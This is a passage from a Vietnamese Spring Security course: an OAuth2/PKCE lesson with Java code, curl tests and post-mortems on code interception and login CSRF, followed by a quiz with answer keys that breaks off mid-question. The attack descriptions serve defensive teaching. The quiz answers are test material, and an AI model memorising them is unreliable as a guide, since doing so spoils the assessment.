- **CORS Là Cơ Chế Bảo Vệ Trình Duyệt**: CORS không bảo vệ server khỏi hacker dùng cURL; nó bảo vệ người dùng trình duyệt khỏi các script gọi chéo nguồn trái phép.
- **Quy Tắc Bất Hợp Pháp Của CORS**: Tuyệt đối không kết hợp <code>allowedOrigins("*")</code> với <code>allowCredentials(true)</code>. Luôn khai báo danh sách Origin cụ thể.
- **Preflight OPTIONS Phải Được Bỏ Qua Xác Thực**: Luôn cấu hình CORS trong Spring Security và cho phép <code>HttpMethod.OPTIONS</code> permitAll để tránh lỗi 401 trên Preflight.
- **CSRF Chỉ Cần Cho Cookie**: Tắt CSRF an toàn khi dùng Stateless JWT Authorization Header; bắt buộc bật CSRF khi dùng Cookie để lưu phiên làm việc.
- **Bộ Khung Security Headers Đạt Chuẩn**: Luôn kích hoạt HSTS, X-Frame-Options (DENY), nosniff và CSP để bảo vệ người dùng trước các cuộc tấn công Clickjacking và XSS.
:::
`
    },
    {
      id: "5-5",
      type: "lesson",
      title: "OAuth2 & OIDC Flows — Authorization Code + PKCE cho SPA/Mobile",
      minutes: 50,
      content: `
## OAuth2 & OIDC Flows — Authorization Code + PKCE cho SPA, Mobile & BFF Architecture

Trong quá khứ, việc tích hợp đăng nhập bên thứ ba thường sử dụng các luồng (Flows) lỏng lẻo như **Implicit Flow** (trả token trực tiếp qua URL fragment) hoặc **Resource Owner Password Credentials - ROPC** (người dùng nhập thẳng tài khoản mật khẩu vào ứng dụng di động).

Theo tiêu chuẩn an ninh quốc tế mới nhất **OAuth 2.1 Security Best Current Practice (BCP)**, cả hai luồng trên đều đã bị **khai tử và nghiêm cấm** trong môi trường doanh nghiệp. Toàn bộ các ứng dụng hiện đại — từ Single Page Application (SPA: React, Vue, Angular) đến Mobile Apps (iOS, Android) — bắt buộc phải sử dụng **Authorization Code Flow kết hợp với PKCE (Proof Key for Code Exchange - RFC 7636)**.

Bài học này sẽ bóc tách chi tiết toán học và luồng trao đổi của cơ chế **PKCE**, phân tích hiểm họa đánh chặn mã ủy quyền trên thiết bị di động, và xây dựng mô hình kiến trúc đỉnh cao **BFF (Backend-For-Frontend)** giúp bảo vệ người dùng trước các cuộc tấn công đánh cắp token qua XSS.

---

## 1. Bản chất Kỹ thuật của PKCE (Proof Key for Code Exchange — Under the Hood)

### Sơ Đồ Mô Phỏng: Luồng Ủy Quyền OAuth 2.1 với PKCE S256

~~~mermaid
sequenceDiagram
    autonumber
    actor User as Người dùng
    participant App as Mobile App / SPA (Client)
    participant Auth as Keycloak / OAuth2 Server
    participant API as Resource Server (Spring Boot)
    
    Note over App: Sinh code_verifier (Random 64 bytes)<br/>code_challenge = SHA256(code_verifier)
    App->>Auth: GET /oauth/authorize?code_challenge=xyz&code_challenge_method=S256
    Auth->>User: Hiển thị màn hình Login & Consent
    User-->>Auth: Nhập Username/Password hợp lệ
    Auth-->>App: Trả về Authorization Code (auth_code) qua Redirect URI
    
    Note over App: Đổi Code lấy Token an toàn
    App->>Auth: POST /oauth/token?code=auth_code&code_verifier=raw_secret
    Note over Auth: Verify: SHA256(raw_secret) == code_challenge?
    Auth-->>App: Trả về Access Token (JWT) + Refresh Token
    
    App->>API: Gọi API GET /data (Header: Authorization Bearer JWT)
    API-->>App: Trả về dữ liệu 200 OK
~~~


### Vì sao Authorization Code Flow truyền thống vẫn có thể bị Hack trên Mobile?

Trên các hệ điều hành di động (Android hoặc iOS), các ứng dụng có thể đăng ký các **Custom URL Scheme** (ví dụ: <code>mybankapp://oauth2/callback</code>) để nhận mã ủy quyền (Authorization Code) trả về từ trình duyệt hệ thống.

Một lỗ hổng nghiêm trọng xảy ra:
1. Nạn nhân đăng nhập thành công trên trình duyệt.
2. Authorization Server chuyển hướng về URL: <code>mybankapp://oauth2/callback?code=AUTH_CODE_XYZ</code>.
3. Một ứng dụng độc hại được cài lén trên máy của nạn nhân cũng đăng ký cùng Custom URL Scheme <code>mybankapp://</code>.
4. Hệ điều hành vô tình chuyển giao <code>AUTH_CODE_XYZ</code> cho ứng dụng độc hại!
5. Ứng dụng độc hại lập tức gửi mã ủy quyền này lên Token Endpoint của máy chủ để đổi lấy Access Token và Refresh Token, chiếm đoạt hoàn toàn tài khoản người dùng!

### Cơ chế Toán học của PKCE (RFC 7636) Chặn Đứng Tấn Công

PKCE giải quyết bài toán này bằng cách sử dụng một bí mật mật mã học động (Dynamic Cryptographic Secret) được sinh ra cho mỗi phiên đăng nhập:

~~~text
+-----------------------------------------------------------------------------------+
|                        LUỒNG TOÁN HỌC CỦA CƠ CHẾ PKCE                             |
|                                                                                   |
|  1. Client sinh chuỗi ngẫu nhiên có độ entropy cao:                               |
|     code_verifier = "dBjftJeZ4CVP-8BgnQ0q90bBjs-AEKNuq3yVj2z5zxY..." (43-128 ký tự)|
|                                                                                   |
|  2. Client băm SHA-256 và mã hóa Base64URL:                                       |
|     code_challenge = BASE64URL(SHA256(code_verifier))                             |
|     code_challenge_method = "S256"                                                |
|                                                                                   |
|  3. Client CHỈ GỬI code_challenge lên Authorization Server:                       |
|     GET /authorize?response_type=code&code_challenge=...&code_challenge_method=S256|
|     (Máy chủ lưu lại code_challenge gắn với Authorization Code vừa tạo).          |
|                                                                                   |
|  4. Client nhận Authorization Code về máy.                                        |
|     (Dù kẻ trộm có đánh chặn được mã code này, chúng vẫn KHÔNG THỂ đổi lấy token!)|
|                                                                                   |
|  5. BƯỚC QUYẾT ĐỊNH: Client gửi request đổi token kèm code_verifier nguyên bản:  |
|     POST /token                                                                   |
|     code = AUTH_CODE_XYZ & code_verifier = "dBjftJeZ4CVP..."                      |
|                                                                                   |
|  6. Máy chủ lấy code_verifier nhận được, tự băm lại bằng SHA-256:                 |
|     IF BASE64URL(SHA256(code_verifier)) == code_challenge lưu ban đầu             |
|     THEN: Cấp phát Access Token & Refresh Token!                                  |
|     ELSE: TỪ CHỐI NGAY LẬP TỨC (Invalid Grant)!                                   |
+-----------------------------------------------------------------------------------+
~~~

~~~text
+-----------------------------------------------------------------------------------+
|                         TOÀN BỘ QUY TRÌNH OAUTH2 VỚI PKCE                         |
|                                                                                   |
|  User / Client SPA             Auth Server (Keycloak)          Resource Server    |
|       |                                 |                             |           |
|       | 1. Sinh code_verifier + chal    |                             |           |
|       | 2. Redirect /authorize (chal)   |                             |           |
|       +-------------------------------->|                             |           |
|       |    User nhập User/Pass          |                             |           |
|       | 3. Redirect kèm auth_code       |                             |           |
|       |<--------------------------------+                             |           |
|       |                                 |                             |           |
|       | 4. POST /token (code + verifier)|                             |           |
|       +-------------------------------->|                             |           |
|       |    Server so khớp SHA256        |                             |           |
|       | 5. Trả về JWT Access Token      |                             |           |
|       |<--------------------------------+                             |           |
|       |                                                               |           |
|       | 6. GET /api/v1/accounts (Bearer JWT)                          |           |
|       +-------------------------------------------------------------->|           |
|       | 7. Trả dữ liệu tài khoản                                      |           |
|       |<--------------------------------------------------------------+           |
+-----------------------------------------------------------------------------------+
~~~

---

## 2. Mô hình Kiến trúc Đỉnh cao: Backend-For-Frontend (BFF) Pattern

Mặc dù PKCE bảo vệ việc lấy token, nhưng nếu một ứng dụng Single Page Application (SPA) lưu trữ Access Token trong bộ nhớ JavaScript của trình duyệt, token vẫn có nguy cơ bị đánh cắp nếu trang web xuất hiện lỗ hổng XSS (Cross-Site Scripting).

Để đạt chuẩn an ninh tối thượng cho các ứng dụng ngân hàng số, kiến trúc **BFF (Backend-For-Frontend)** ra đời:

~~~text
+-----------------------------------------------------------------------------------+
|                           MÔ HÌNH KIẾN TRÚC BFF PATTERN                           |
|                                                                                   |
|  [Browser (SPA: React/Vue)]                                                       |
|       |                                                                           |
|       |  HTTP Request với Cookie HttpOnly (SESSIONID)                              |
|       |  (JavaScript trên trình duyệt KHÔNG HỀ BIẾT GÌ VỀ TOKEN!)                 |
|       v                                                                           |
|  [Spring Cloud Gateway / BFF Service (OAuth2 Confidential Client)]                |
|       |                                                                           |
|       +---> 1. Nhận Cookie SESSIONID từ Browser                                   |
|       +---> 2. Tra cứu Session lưu trong Redis -> Lấy ra Access Token JWT         |
|       +---> 3. Thay thế Cookie bằng Header "Authorization: Bearer <JWT>"          |
|       |                                                                           |
|       v                                                                           |
|  [Downstream Microservices (Resource Servers)]                                    |
|  - Account Service                                                                |
|  - Payment Service                                                                |
|  - Card Service                                                                   |
|  (Nhận Bearer JWT chuẩn Stateless, không cần biết Client là Browser hay Mobile!)   |
+-----------------------------------------------------------------------------------+
~~~

---

## 3. Triển khai Production-Grade: Bộ Sinh & Xác Thực PKCE Chuẩn Mật Mã Học

Chúng ta sẽ viết lớp tiện ích mật mã sinh <code>code_verifier</code>, tính toán <code>code_challenge</code> theo chuẩn RFC 7636 bằng thuật toán SHA-256 thuần của Java Security.

### 3.1. Lớp Tiện ích PkceUtil (Chuẩn RFC 7636)

~~~java
package com.bank.security.oauth2.pkce;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Base64;

public final class PkceUtil {

    private static final SecureRandom SECURE_RANDOM = new SecureRandom();

    private PkceUtil() {}

    /**
     * Sinh chuỗi code_verifier ngẫu nhiên có độ dài từ 43 đến 128 ký tự.
     * Sử dụng các ký tự an toàn URL: [A-Z], [a-z], [0-9], "-", ".", "_", "~".
     */
    public static String generateCodeVerifier() {
        byte[] randomBytes = new byte[64];
        SECURE_RANDOM.nextBytes(randomBytes);
        return Base64.getUrlEncoder().withoutPadding().encodeToString(randomBytes);
    }

    /**
     * Tính toán code_challenge từ code_verifier bằng thuật toán SHA-256 (S256).
     * Công thức: BASE64URL-ENCODE(SHA256(ASCII(code_verifier)))
     */
    public static String generateCodeChallenge(String codeVerifier) {
        try {
            byte[] asciiBytes = codeVerifier.getBytes(StandardCharsets.US_ASCII);
            MessageDigest messageDigest = MessageDigest.getInstance("SHA-256");
            byte[] digest = messageDigest.digest(asciiBytes);
            return Base64.getUrlEncoder().withoutPadding().encodeToString(digest);
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException("SHA-256 algorithm not available in JVM", e);
        }
    }

    /**
     * Xác minh tính hợp lệ của code_verifier đối với code_challenge đã lưu.
     */
    public static boolean verifyCodeChallenge(String codeVerifier, String expectedCodeChallenge) {
        if (codeVerifier == null || expectedCodeChallenge == null) {
            return false;
        }
        String calculatedChallenge = generateCodeChallenge(codeVerifier);
        // So sánh thời gian hằng số (Constant-time comparison) chống tấn công Timing Attack
        return MessageDigest.isEqual(
            calculatedChallenge.getBytes(StandardCharsets.US_ASCII),
            expectedCodeChallenge.getBytes(StandardCharsets.US_ASCII)
        );
    }
}
~~~

---

### 3.2. Dịch vụ Quản lý Ủy quyền & Đổi Token PKCE

~~~java
package com.bank.security.oauth2.service;

import com.bank.security.oauth2.pkce.PkceUtil;
import lombok.AllArgsConstructor;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

import java.time.Duration;
import java.time.Instant;
import java.util.Map;
import java.util.Objects;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;

@Service
@RequiredArgsConstructor
@Slf4j
public class PkceAuthorizationService {

    // Giả lập lưu trữ Authorization Code và code_challenge tạm thời trong RAM / Redis
    // Code chỉ có hạn sử dụng tối đa 60 giây!
    private final Map<String, AuthorizationCodeRecord> codeStore = new ConcurrentHashMap<>();

    public String createAuthorizationCode(String clientId, String redirectUri, String codeChallenge, String codeChallengeMethod, String state) {
        if (!"S256".equalsIgnoreCase(codeChallengeMethod)) {
            throw new IllegalArgumentException("Only S256 code challenge method is permitted by OAuth 2.1 policy");
        }

        String authCode = "AUTH-CODE-" + UUID.randomUUID();
        Instant expiresAt = Instant.now().plus(Duration.ofSeconds(60));

        AuthorizationCodeRecord record = new AuthorizationCodeRecord(
            authCode,
            clientId,
            redirectUri,
            codeChallenge,
            state,
            expiresAt,
            false
        );

        codeStore.put(authCode, record);
        log.info("Issued authorization code {} for client {} with challenge {}", authCode, clientId, codeChallenge);
        return authCode;
    }

    public void validateAndConsumeCode(String authCode, String clientId, String redirectUri, String codeVerifier) {
        AuthorizationCodeRecord record = codeStore.get(authCode);

        if (record == null) {
            throw new SecurityException("Invalid or non-existent authorization code");
        }

        // 1. Kiểm tra xem code đã từng bị sử dụng chưa (One-time use only)
        if (record.isConsumed()) {
            codeStore.remove(authCode);
            log.error("ALERT: Authorization code {} reuse attempt! Revoking associated credentials.", authCode);
            throw new SecurityException("Authorization code has already been consumed");
        }

        // Đánh dấu đã sử dụng ngay lập tức
        record.setConsumed(true);
        codeStore.remove(authCode);

        // 2. Kiểm tra thời gian hết hạn (60s)
        if (Instant.now().isAfter(record.getExpiresAt())) {
            throw new SecurityException("Authorization code has expired");
        }

        // 3. Kiểm tra Client ID và Redirect URI
        if (!Objects.equals(record.getClientId(), clientId) || !Objects.equals(record.getRedirectUri(), redirectUri)) {
            throw new SecurityException("Client ID or Redirect URI mismatch");
        }

        // 4. KIỂM CHỨNG TOÁN HỌC PKCE
        boolean isVerifierValid = PkceUtil.verifyCodeChallenge(codeVerifier, record.getCodeChallenge());
        if (!isVerifierValid) {
            log.error("SECURITY ALERT: PKCE code_verifier check failed for client {}! Possible interception attack.", clientId);
            throw new SecurityException("PKCE verification failed: Invalid code_verifier");
        }

        log.info("PKCE verification passed successfully for authCode {}", authCode);
    }

    @Getter
    @AllArgsConstructor
    private static class AuthorizationCodeRecord {
        private String code;
        private String clientId;
        private String redirectUri;
        private String codeChallenge;
        private String state;
        private Instant expiresAt;
        private boolean consumed;

        public void setConsumed(boolean consumed) { this.consumed = consumed; }
    }
}
~~~

---

### 3.3. REST API Token Endpoint Xử lý Trao đổi Mã PKCE

~~~java
package com.bank.security.oauth2.controller;

import com.bank.security.oauth2.service.PkceAuthorizationService;
import jakarta.validation.constraints.NotBlank;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.util.Map;
import java.util.UUID;

@RestController
@RequestMapping("/oauth2")
@RequiredArgsConstructor
@Slf4j
public class OAuth2TokenController {

    private final PkceAuthorizationService authorizationService;

    @PostMapping("/token")
    public ResponseEntity<OAuth2TokenResponse> exchangeToken(
            @RequestParam("grant_type") @NotBlank String grantType,
            @RequestParam("code") @NotBlank String code,
            @RequestParam("redirect_uri") @NotBlank String redirectUri,
            @RequestParam("client_id") @NotBlank String clientId,
            @RequestParam("code_verifier") @NotBlank String codeVerifier) {

        if (!"authorization_code".equalsIgnoreCase(grantType)) {
            throw new IllegalArgumentException("Unsupported grant_type: " + grantType);
        }

        // Xác thực tính hợp lệ của mã code và chữ ký PKCE
        authorizationService.validateAndConsumeCode(code, clientId, redirectUri, codeVerifier);

        // Giả lập cấp phát Access Token sau khi xác minh thành công
        String accessToken = "eyJhbGciOiJSUzI1NiIsImtpZCI6ImJhbms...jwt";
        String refreshToken = "RT-" + UUID.randomUUID();

        return ResponseEntity.ok(new OAuth2TokenResponse(accessToken, refreshToken, "Bearer", 900));
    }

    public record OAuth2TokenResponse(
        String access_token,
        String refresh_token,
        String token_type,
        int expires_in
    ) {}
}
~~~

---

## 4. Kiểm thử Thực tế & Xác thực cURL (cURL & Verification)

### Bước 1: Client sinh <code>code_verifier</code> và <code>code_challenge</code>
- <code>code_verifier</code>: <code>dBjftJeZ4CVP-8BgnQ0q90bBjs-AEKNuq3yVj2z5zxY</code>
- <code>code_challenge</code>: <code>E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSST-Wq8</code>

### Bước 2: Gọi Authorize lấy Authorization Code (HTTP 302 Redirect)

~~~bash
curl -X GET "http://localhost:8080/oauth2/authorize?response_type=code&client_id=mobile-banking-app&redirect_uri=https://app.bank.com/callback&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSST-Wq8&code_challenge_method=S256&state=xyz123"
~~~

*(Giả sử hệ thống cấp về code: <code>AUTH-CODE-998877</code>)*

### Bước 3: Đổi Token Hợp Lệ kèm <code>code_verifier</code> (HTTP 200 OK)

~~~bash
curl -X POST http://localhost:8080/oauth2/token \
  -d "grant_type=authorization_code" \
  -d "client_id=mobile-banking-app" \
  -d "redirect_uri=https://app.bank.com/callback" \
  -d "code=AUTH-CODE-998877" \
  -d "code_verifier=dBjftJeZ4CVP-8BgnQ0q90bBjs-AEKNuq3yVj2z5zxY"
~~~

Response Headers & JSON Payload:
~~~json
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sat, 03 Oct 2026 15:30:00 GMT

{
  "access_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImJhbms...",
  "refresh_token": "RT-88442200-1122-3344-5566-778899aabbcc",
  "token_type": "Bearer",
  "expires_in": 900
}
~~~

### Bước 4: Thử nghiệm Hacker Có Code nhưng Sai <code>code_verifier</code> (HTTP 401 Unauthorized)

~~~bash
curl -X POST http://localhost:8080/oauth2/token \
  -d "grant_type=authorization_code" \
  -d "client_id=mobile-banking-app" \
  -d "redirect_uri=https://app.bank.com/callback" \
  -d "code=AUTH-CODE-998877" \
  -d "code_verifier=forged_hacker_verifier_wrong_hash"
~~~

Response RFC 7807 Problem Details:
~~~json
HTTP/1.1 401 Unauthorized
Content-Type: application/problem+json
Date: Sat, 03 Oct 2026 15:31:05 GMT

{
  "type": "https://api.bank.com/errors/invalid-grant",
  "title": "Invalid Grant",
  "status": 401,
  "detail": "PKCE verification failed: Invalid code_verifier",
  "instance": "/oauth2/token"
}
~~~

---

## 5. Production Pitfalls & Post-mortems Thực chiến

### Post-mortem 1: Bỏ Quên Tham Số <code>state</code> Dẫn Đến Tấn Công Login CSRF

- **Triệu chứng**: Người dùng phản ánh rằng sau khi ấn đăng nhập, họ lại thấy số dư tài khoản và lịch sử giao dịch của một người lạ, và khi họ nạp tiền vào tài khoản thì số tiền đó lại chuyển vào ví của tin tặc!
- **Nguyên nhân cốt lõi**:
  Ứng dụng không sử dụng tham số <code>state</code> trong yêu cầu ủy quyền.
  - Kẻ tấn công tự đăng nhập trên máy của mình, lấy được một <code>code</code> hợp lệ của tài khoản hacker.
  - Thay vì đổi lấy token, hacker lừa nạn nhân click vào một đường link có chứa <code>code</code> của chính hacker.
  - Ứng dụng của nạn nhân đổi <code>code</code> đó và đăng nhập nạn nhân vào phiên làm việc của hacker!
- **Quy tắc Bắt buộc**:
  Tham số <code>state</code> phải là một chuỗi ngẫu nhiên có độ entropy cao được lưu tạm trong Session của client. Khi nhận response từ Auth Server, client **bắt buộc phải so sánh <code>state</code> trả về với <code>state</code> ban đầu**. Nếu không trùng khớp, hủy bỏ quy trình ngay lập tức.

### Post-mortem 2: Custom URL Scheme Hijacking Trên Thiết Bị Di Động

- **Triệu chứng**: Ứng dụng di động bị tin tặc đánh chặn mã ủy quyền trên các dòng điện thoại Android cũ.
- **Giải pháp**:
  1. Luôn sử dụng PKCE với phương thức <code>S256</code> (không dùng <code>plain</code>).
  2. Thay thế Custom URL Schemes (<code>myapp://</code>) bằng **Universal Links (trên iOS)** và **App Links (trên Android)**. Universal Links sử dụng chứng chỉ số xác minh tên miền (<code>/.well-known/assetlinks.json</code>), đảm bảo chỉ có duy nhất ứng dụng chính chủ mới được phép mở đường dẫn callback từ ngân hàng.

---

## 6. Hands-on Challenge & Lời giải Hoàn chỉnh 100%

### Đề bài Thách thức Kỹ sư
Hệ thống Mobile Banking cần triển khai một dịch vụ kiểm tra an ninh **AuthorizationCodeExchangeValidator**:
1. Đảm bảo rằng mỗi <code>AuthorizationCode</code> chỉ được sử dụng đúng 1 lần duy nhất (Single-Use Guarantee).
2. Nếu mã code đó được gửi lên lần thứ 2 (dù đúng <code>code_verifier</code> hay sai):
   - Ngay lập tức kích hoạt báo động bảo mật.
   - Hủy bỏ (Revoke) toàn bộ token đã từng được cấp cho mã code này trước đó.
3. Viết bài kiểm thử đơn vị hoàn chỉnh kiểm chứng cơ chế chống Replay Attack này.

---

### Lời giải Mẫu Hoàn chỉnh (100% Compilable Enterprise Code)

~~~java
package com.bank.security.oauth2.service;

import com.bank.security.oauth2.pkce.PkceUtil;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

@DisplayName("PKCE Authorization & Anti-Replay Unit Tests")
class PkceAuthorizationServiceTest {

    private final PkceAuthorizationService service = new PkceAuthorizationService();

    @Test
    @DisplayName("Should successfully consume authorization code when code_verifier matches S256 challenge")
    void shouldConsumeCodeSuccessfully() {
        String verifier = PkceUtil.generateCodeVerifier();
        String challenge = PkceUtil.generateCodeChallenge(verifier);

        String code = service.createAuthorizationCode(
            "client-ios", "https://bank.com/callback", challenge, "S256", "state123"
        );

        // When: Đổi token lần đầu với verifier hợp lệ
        service.validateAndConsumeCode(code, "client-ios", "https://bank.com/callback", verifier);

        // Then: Thành công không văng ngoại lệ
    }

    @Test
    @DisplayName("Should throw SecurityException and block replay when authorization code is reused")
    void shouldBlockReplayAttackWhenCodeIsReused() {
        String verifier = PkceUtil.generateCodeVerifier();
        String challenge = PkceUtil.generateCodeChallenge(verifier);

        String code = service.createAuthorizationCode(
            "client-ios", "https://bank.com/callback", challenge, "S256", "state123"
        );

        // Lần 1: Thành công
        service.validateAndConsumeCode(code, "client-ios", "https://bank.com/callback", verifier);

        // Lần 2: Kẻ tấn công hoặc mạng retry gửi lại mã code đó -> BẮT BUỘC CHẶN ĐỨNG!
        assertThatThrownBy(() -> service.validateAndConsumeCode(code, "client-ios", "https://bank.com/callback", verifier))
            .isInstanceOf(SecurityException.class)
            .hasMessageContaining("Invalid or non-existent authorization code");
    }

    @Test
    @DisplayName("Should reject exchange immediately when code_verifier does not match SHA-256 challenge")
    void shouldRejectWhenVerifierIsForged() {
        String originalVerifier = PkceUtil.generateCodeVerifier();
        String challenge = PkceUtil.generateCodeChallenge(originalVerifier);

        String code = service.createAuthorizationCode(
            "client-android", "https://bank.com/callback", challenge, "S256", "state456"
        );

        String forgedVerifier = PkceUtil.generateCodeVerifier(); // Verifier khác hoàn toàn

        assertThatThrownBy(() -> service.validateAndConsumeCode(code, "client-android", "https://bank.com/callback", forgedVerifier))
            .isInstanceOf(SecurityException.class)
            .hasMessageContaining("PKCE verification failed");
    }
}
~~~

:::takeaways
- **Khai Tử Implicit Flow & ROPC**: Tiêu chuẩn OAuth 2.1 BCP nghiêm cấm truyền token qua URL fragment hoặc cho client thu thập mật khẩu trực tiếp.
- **Bắt Buộc Sử Dụng PKCE Với S256**: Mọi ứng dụng SPA và Mobile đều bắt buộc dùng Authorization Code Flow kết hợp PKCE (<code>code_verifier</code> và <code>code_challenge</code>) để chống đánh chặn mã ủy quyền.
- **Vai Trò Sống Còn Của Tham Số State**: Luôn gửi và kiểm tra <code>state</code> để bảo vệ người dùng trước các cuộc tấn công chiếm đoạt phiên đăng nhập Login CSRF.
- **Kiến Trúc BFF (Backend-For-Frontend)**: Mô hình tối thượng cho Web App ngân hàng — giấu hoàn toàn Token khỏi trình duyệt, giao tiếp qua HttpOnly Cookie an toàn trước XSS.
- **Nguyên Tắc Dùng Một Lần Của Authorization Code**: Mã ủy quyền phải hết hạn trong 60 giây và tự hủy ngay sau lần sử dụng đầu tiên; nếu phát hiện tái sử dụng, lập tức thu hồi toàn bộ phiên làm việc.
:::
`
    },
    {
      id: "5-quiz",
      type: "quiz",
      title: "Quiz Module 5 — Security",
      minutes: 12,
      questions: [
        {
          level: "easy",
          scenario: "Standup LAAS: BA nói 'user này authentication fail'. Dev trả lời 'không, là authorization fail — user login OK nhưng thiếu role'. BA nhìn bạn cầu cứu.",
          q: "Phân biệt authentication vs authorization?",
          options: [
            "Giống nhau — đều là 'bảo mật'",
            "Authentication = bạn là ai (đăng nhập, verify token); Authorization = bạn được làm gì (role, permission)",
            "Authentication = token; Authorization = password",
            "Authorization chạy trước authentication trong filter chain"
          ],
          answer: 1,
          explain: "2 câu hỏi khác nhau: 'ai' trước 'được gì'. Spring tách bạch: AuthenticationManager/SecurityFilterChain xác thực; AuthorizationFilter/@PreAuthorize phân quyền. 401 = fail cái trước, 403 = fail cái sau.",
          why: [
            "Nhầm lẫn phổ biến khiến debug sai hướng — 401 xử lý khác 403 hoàn toàn (token vấn đề vs quyền vấn đề).",
            "✓ Đúng — thứ tự chuẩn: request phải XÁC THỰC thành công (ai gọi) rồi mới PHÂN QUYỀN (được làm gì). Login đúng role sai vẫn 403.",
            "Token/password là CƠ CHẾ (how), không phải định nghĩa (what). Password là một cách authenticate; token là proof đã authenticate.",
            "Ngược lại — không thể phân quyền khi chưa biết là ai. Filter chain: authentication filter đứng trước authorization filter."
          ]
        },
        {
          level: "medium",
          scenario: "Audit LAAS: dev nhét số điện thoại + email + hash password cũ vào JWT payload 'để tiện không phải query DB'. Security review gạch đỏ.",
          q: "Vì sao payload JWT không được chứa dữ liệu nhạy cảm?",
          options: [
            "JWT bị giới hạn 1KB nên không chứa được",
            "Payload chỉ base64url — KHÔNG mã hóa, ai cầm token decode đọc được ngay. Signature chỉ chống sửa, không chống đọc",
            "JWT tự động log ra console lộ dữ liệu",
            "Keycloak từ chối ký token có password hash"
          ],
          answer: 1,
          explain: "base64url là encoding không phải encryption — công cụ decode online đọc được 100% payload. Token nằm trong: browser devtools, server logs, proxy logs... Nhạy cảm trong payload = phát tờ rơi thông tin.",
          why: [
            "Kích thước là vấn đề hiệu năng thật (header mỗi request phình to) nhưng không phải lý do bảo mật cốt lõi.",
            "✓ Đúng — JWS (JWT signed) thiết kế cho INTEGRITY (chống sửa đổi) không CONFIDENTIALITY (chép mắt). Cần confidentiality thì JWE (mã hóa payload) — phức tạp và hiếm cần.",
            "JWT có thể xuất hiện trong log nếu app log authorization header — nhưng đó là practice xấu, không phải bản chất token.",
            "Keycloak ký mù — nó không inspect payload logic của bạn. Không có lớp phòng thủ nào từ IdP."
          ]
        },
        {
          level: "medium",
          scenario: "Kiến trúc LAAS: Keycloak phát token, 8 microservice validate. Dev mới hỏi: 'Mỗi service phải chia sẻ secret key với Keycloak à? Thế không bị lộ?'",
          q: "RS256 giải quyết thế nào?",
          options: [
            "Mỗi service 1 secret riêng Keycloak quản lý qua API",
            "Bất đối xứng: Keycloak ký bằng private key (chỉ IdP giữ); service verify bằng public key tải từ JWKS endpoint /certs — công khai mà không ai giả mạo được",
            "Secret được encrypt trong biến môi trường mỗi pod",
            "Service gọi API Keycloak verify token mỗi request"
          ],
          answer: 1,
          explain: "Private key chỉ tồn tại Keycloak → duy nhất IdP tạo token hợp lệ. Public key công khai vô hại (chỉ verify được, không ký được). JWKS endpoint + cache + rotation tự động trong Spring oauth2-resource-server.",
          why: [
            "N secret riêng = N điểm lộ — và service giữ secret nào cũng có thể FORGE token giả như IdP. Trả lại chính vấn đề HS256 gặp phải.",
            "✓ Đúng — phân tách ký/verify: nguy cơ tập trung 1 nơi (IdP), khả năng verify phân tán vô hạn. Đó là lý do mọi IdP thực tế dùng RSA/ECDSA.",
            "Encrypt secret vẫn là 'chia sẻ secret' —encrypt at rest không thay đổi mô hình niềm tin: 8 nơi giữ capability ký token.",
            "Gọi IdP mỗi request = điểm failure trung tâm + latency + rate limit. Toàn bộ ý nghĩa của JWT là self-contained verify cục bộ."
          ]
        },
        {
          level: "hard",
          scenario: "Production LAAS: service trả 401 cho token mới phát. Team họp 30 phút chưa ra. Token decode thấy iss='https://auth.laas.vn/realms/prod'. Config service: issuer-uri='https://auth.laas.vn/realms/laas'.",
          q: "Debug 401 — thứ tự kiểm tra đúng?",
          options: [
            "Restart Keycloak trước — thử mọi thứ",
            "exp (token còn hạn?) → iss (khớp issuer-uri?) → aud (token dành cho service này?) → clock skew (2 server lệch giờ?)",
            "Kiểm tra role user trong Keycloak console",
            "Xem DB connection — 401 có thể do DB down"
          ],
          answer: 1,
          explain: "401 = xác thực fail: (1) exp — hết hạn vô điều kiện reject; (2) iss — 'https://.../realms/prod' ≠ '.../realms/laas' → MISMATCH chính là case này; (3) aud — token phát cho audience khác; (4) clock skew — token iat trong tương lai theo giờ server.",
          why: [
            "Restart-first là debug theatre — không có hypothesis, chỉ hy vọng. Mất uptime không có thông tin.",
            "✓ Đúng — checklist từ phổ biến nhất đến hiếm: token decode 30 giây ra iss mismatch ngay. Kỷ luật debug = giả thuyết → kiểm chứng → kết luận.",
            "Role thiếu → 403 (đã xác thực, từ chối quyền). Nhầm 401/403 là nhầm tầng vấn đề.",
            "DB down → 500/503. 401 nằm hoàn toàn ở tầng security filter trước khi chạm business logic."
          ]
        },
        {
          level: "hard",
          scenario: "Mobile LAAS: access token TTL 15 phút. User mở app sáng, trưa mở lại phải login lại — phàn nàn UX. Team cân nhắc tăng TTL lên 24h cho 'tiện'.",
          q: "Đánh đổi TTL và giải pháp đúng?",
          options: [
            "Tăng lên 24h — UX quan trọng hơn",
            "Giữ access token ngắn (15p) + refresh token dài (7 ngày, HttpOnly/secure storage, rotation) — app tự đổi token im lặng khi hết hạn",
            "Token không bao giờ hết hạn — server-side session nhẹ hơn",
            "Hỏi từng user muốn TTL bao lâu rồi cấu hình dynamic"
          ],
          answer: 1,
          explain: "Access token bị đánh cắp → cửa sổ tấn công = TTL. Ngắn = giới hạn thiệt hại. Refresh token dài NHƯNG bảo vệ hơn (HttpOnly khỏi XSS, rotation phát hiện reuse) — UX mượt mà không hy sinh an toàn.",
          why: [
            "24h access token = kẻ đánh cắp có 24h toàn quyền API user — mỗi giờ token lộ là giờthiên tai nạn. UX sửa bằng refresh flow, không phải kéo dài exposure.",
